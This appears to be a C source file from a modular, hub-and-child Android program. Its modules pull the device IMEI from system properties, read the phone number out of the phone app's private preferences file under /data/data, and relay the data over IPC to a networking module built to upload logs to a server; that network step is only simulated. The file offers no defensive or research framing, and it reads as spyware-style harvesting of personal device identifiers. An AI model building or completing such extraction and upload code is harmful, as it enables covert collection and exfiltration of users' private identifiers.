/**
 * @file modules.c
 * @brief Implementation of Functional Modules
 * * Implements business logic for IMEI, Phone, and Network modules.
 * * Includes robust I/O helpers and optimized IPC.
 */

#define _GNU_SOURCE // For standard extensions

#include "modules.h"
#include "ipc_defs.h"
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/socket.h> // For recvmsg
#include <sys/uio.h>    // For struct iovec

// ==============================================================================================
// SECTION: Internal Simulation Helpers (Networking)
// ==============================================================================================

static void send_log_to_server(const char* log) {
    // Simulated network transmission
    LOG_INFO("NetLib", "[Network TX] Uploading log: %s", log);
    usleep(50000); // Simulate network latency
}

static void request_data_from_server(const char* req, char* out_buf, size_t max_len) {
    // Simulated network request
    LOG_INFO("NetLib", "[Network TX] Requesting data: %s", req);
    usleep(100000); // Simulate latency
    
    // Simulated response
    snprintf(out_buf, max_len, "ServerResponse: Data for '%s' [ID: %d]", req, rand() % 9999);
}

// ==============================================================================================
// SECTION: Child Process IPC Helpers
// ==============================================================================================

static void send_tlv(int fd, uint8_t type, const void* data, uint16_t len) {
    if (len + HEADER_SIZE > MAX_PACKET_SIZE) {
        LOG_ERROR("HubChild", "TX Error: Packet size (%d) exceeds limit", len + HEADER_SIZE);
        return; 
    }

    uint8_t buffer[MAX_PACKET_SIZE];
    ipc_serialize_header(buffer, type, len);

    if (len > 0 && data) {
        memcpy(buffer + HEADER_SIZE, data, len);
    }

    ssize_t sent = write(fd, buffer, HEADER_SIZE + len);
    
    if (sent < 0) {
        LOG_ERROR("HubChild", "TX Failed: %s", strerror(errno));
    } else if (sent != HEADER_SIZE + len) {
        LOG_ERROR("HubChild", "TX Partial Write: Sent %zd of %d bytes", sent, HEADER_SIZE + len);
    }
}

/**
 * @brief Reads a TLV packet using scatter/gather I/O (Optimization 2.1).
 * Eliminates double-buffering by reading header and payload directly into targets.
 */
static int read_tlv(int fd, uint8_t* out_type, uint8_t* buffer, int max_len) {
    uint8_t header[HEADER_SIZE];
    struct iovec iov[2];
    struct msghdr msg = {0};

    // Vector 1: Header
    iov[0].iov_base = header;
    iov[0].iov_len = HEADER_SIZE;

    // Vector 2: User Payload Buffer
    // We assume the caller provides a buffer large enough for their expected data.
    // If the packet is larger than max_len, we might truncate or need handling.
    iov[1].iov_base = buffer;
    iov[1].iov_len = max_len;

    msg.msg_iov = iov;
    msg.msg_iovlen = 2;

    // recvmsg allows us to detect truncation via MSG_TRUNC flag if needed,
    // and fills both buffers in a single syscall.
    ssize_t r = recvmsg(fd, &msg, 0);

    if (r < 0) {
        LOG_ERROR("HubChild", "RX Failed: %s", strerror(errno));
        return -1;
    }
    if (r == 0) return -1; // EOF

    if (r < HEADER_SIZE) {
        LOG_ERROR("HubChild", "RX Error: Packet too short (%zd bytes)", r);
        return -1;
    }

    uint16_t len;
    if (ipc_parse_header(header, out_type, &len) != 0) {
        LOG_ERROR("HubChild", "RX Error: Header parse failed");
        return -1;
    }

    // Validate received size against protocol length
    if (r != HEADER_SIZE + len) {
        LOG_ERROR("HubChild", "RX Error: Size Mismatch. Header claims %d bytes, read %zd bytes", len, r - HEADER_SIZE);
        return -1;
    }

    // Safety null-terminate if buffer space allows
    if (len < max_len) {
        buffer[len] = '\0';
    } else if (len > 0) {
        buffer[max_len - 1] = '\0'; // Force null term on truncation boundary
    }

    return len;
}

// ==============================================================================================
// SECTION: Utility Helpers
// ==============================================================================================

/**
 * @brief robust file reader (Fix 1.2).
 * Loops until EOF to handle short reads or interruptions.
 */
static char* read_file_fully(const char* path, size_t* out_size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return NULL;

    size_t capacity = 4096;
    size_t size = 0;
    char* buf = malloc(capacity);
    
    if (!buf) {
        close(fd);
        return NULL;
    }

    while (1) {
        if (size + 1024 > capacity) {
            capacity *= 2;
            char* new_buf = realloc(buf, capacity);
            if (!new_buf) {
                free(buf);
                close(fd);
                return NULL;
            }
            buf = new_buf;
        }

        ssize_t r = read(fd, buf + size, capacity - size - 1);
        if (r < 0) {
            if (errno == EINTR) continue;
            free(buf);
            close(fd);
            return NULL;
        }
        if (r == 0) break; // EOF
        size += r;
    }

    buf[size] = '\0';
    if (out_size) *out_size = size;
    close(fd);
    return buf;
}

/**
 * @brief Robust XML value extractor (Fix 1.1).
 * Searches for 'name="KEY"' and extracts the value between tags.
 * Avoids false positives in comments or partial matches.
 */
static int extract_xml_val(const char* xml, const char* key, char* out_buf, size_t max_len) {
    char search_attr[128];
    snprintf(search_attr, sizeof(search_attr), "name=\"%s\"", key);

    const char* attr_pos = strstr(xml, search_attr);
    if (!attr_pos) return -1;

    // Find the end of this tag '>'
    const char* tag_end = strchr(attr_pos, '>');
    if (!tag_end) return -1;
    tag_end++; // Move past '>'

    // Find the start of the closing tag '<'
    const char* val_end = strchr(tag_end, '<');
    if (!val_end) return -1;

    size_t len = val_end - tag_end;
    if (len >= max_len) len = max_len - 1;

    memcpy(out_buf, tag_end, len);
    out_buf[len] = '\0';
    return 0;
}

// ==============================================================================================
// SECTION: Module 1 - IMEI Extractor
// ==============================================================================================

void mod_imei_entry(int socket_fd) {
    const char* TAG = "ModIMEI";
    const char* PROP_KEY = "ro.id.imei";
    
    LOG_INFO(TAG, "Starting IMEI extraction...");
    
    uint8_t type;
    uint8_t buf[MAX_PAYLOAD_SIZE];
    if (read_tlv(socket_fd, &type, buf, sizeof(buf)) < 0) return;

    char prop_val[128] = {0};
    if (!g_api->sys_prop_get) {
        const char* err = "SYMBOL_RESOLVER Error: sys_prop_get not resolved";
        send_tlv(socket_fd, MSG_ERROR, err, strlen(err));
        return;
    }

    int len = g_api->sys_prop_get(PROP_KEY, prop_val);

    if (len <= 0 || strlen(prop_val) == 0) {
        LOG_ERROR(TAG, "IMEI property is empty or missing");
        const char* err = "Error: IMEI not found";
        send_tlv(socket_fd, MSG_ERROR, err, strlen(err));
        return;
    }

    LOG_INFO(TAG, "IMEI Extracted: %s", prop_val);
    send_tlv(socket_fd, MSG_RESPONSE, prop_val, strlen(prop_val));
}

// ==============================================================================================
// SECTION: Module 2 - Phone Number Extractor
// ==============================================================================================

void mod_phone_entry(int socket_fd) {
    const char* TAG = "ModPhone";
    const char* FILE_PATH = "/data/data/com.android.phone/shared_prefs/com.android.phone_preferences.xml";
    const char* TARGET_KEY = "phone_number_value";
    
    LOG_INFO(TAG, "Starting Phone Number extraction...");

    uint8_t type;
    uint8_t buf[MAX_PAYLOAD_SIZE];
    if (read_tlv(socket_fd, &type, buf, sizeof(buf)) < 0) return;

    char* file_content = NULL;
    const char* err_msg = NULL;

    // 1. Read File (Robust)
    file_content = read_file_fully(FILE_PATH, NULL);
    if (!file_content) {
        LOG_ERROR(TAG, "Failed to read prefs: %s", strerror(errno));
        err_msg = "Error: Read failed or OOM";
        goto cleanup;
    }

    // 2. Parse XML (Robust)
    char value[256];
    if (extract_xml_val(file_content, TARGET_KEY, value, sizeof(value)) != 0) {
        LOG_ERROR(TAG, "Key %s not found in XML", TARGET_KEY);
        err_msg = "Error: Key not found or Malformed XML";
        goto cleanup;
    }

    // 3. Success
    send_tlv(socket_fd, MSG_RESPONSE, value, strlen(value));

cleanup:
    if (file_content) free(file_content);
    if (err_msg) send_tlv(socket_fd, MSG_ERROR, err_msg, strlen(err_msg));
}

// ==============================================================================================
// SECTION: Module 3 - Networking Module
// ==============================================================================================

void mod_network_entry(int socket_fd) {
    const char* TAG = "ModNet";
    LOG_INFO(TAG, "Network Service Started. Waiting for commands...");

    uint8_t type;
    uint8_t buf[MAX_PAYLOAD_SIZE];

    while (1) {
        int len = read_tlv(socket_fd, &type, buf, sizeof(buf));
        if (len < 0) {
            LOG_INFO(TAG, "Hub disconnected.");
            break;
        }

        if (type == MSG_LOG_ENTRY) {
            LOG_INFO(TAG, "Processing Log Upload...");
            send_log_to_server((char*)buf);
        } 
        else if (type == MSG_REQUEST) {
            LOG_INFO(TAG, "Processing Data Request: %s", (char*)buf);
            
            char response[512];
            request_data_from_server((char*)buf, response, sizeof(response));
            
            size_t resp_len = strlen(response);
            LOG_INFO(TAG, "Received Response (%zu bytes): %s", resp_len, response);
            
            send_tlv(socket_fd, MSG_RESPONSE, response, resp_len);
        }
    }
}